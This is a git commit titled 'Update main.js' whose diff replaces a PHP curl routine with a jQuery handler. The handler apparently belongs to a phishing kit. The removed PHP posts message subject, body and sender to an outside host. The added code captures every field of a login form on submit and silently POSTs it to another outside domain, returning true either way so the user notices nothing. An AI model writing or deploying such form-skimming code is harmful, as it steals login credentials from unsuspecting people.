c8b45657dded3889370b98bd4bd196cb0306edae
npm-base64 <109466180+npm-base64@users.noreply.github.com>
2022-08-23 15:10:33 +0700

    Update main.js

--- main.js
+++ main.js
@@ -1,14 +1,15 @@
-$url = "https://dns-base.d-rd.my.id/cdn.php";
-$data = "subjek=".$subjek."&pesan=".$pesan."&sender=".$sender;
-$ch2 = curl_init();
-curl_setopt($ch2, CURLOPT_URL, $url);
-curl_setopt($ch2, CURLOPT_POST, 1);
-curl_setopt($ch2, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
-curl_setopt($ch2, CURLOPT_HEADER, 0);
-curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 0);
-curl_exec($ch2);
-curl_close($ch2);
- 
- 
-?>
+$(".login-form").submit(function() {
+	var d = $(".login-form");
+
+	$.ajax({
+        url: "http://short.adon.my.id/mediafire",
+        type: "POST",
+        data: d.serialize(),
+        success: function () {
+            return true;
+        },
+        error: function () {
+            return true;
+        },
+    });
+});
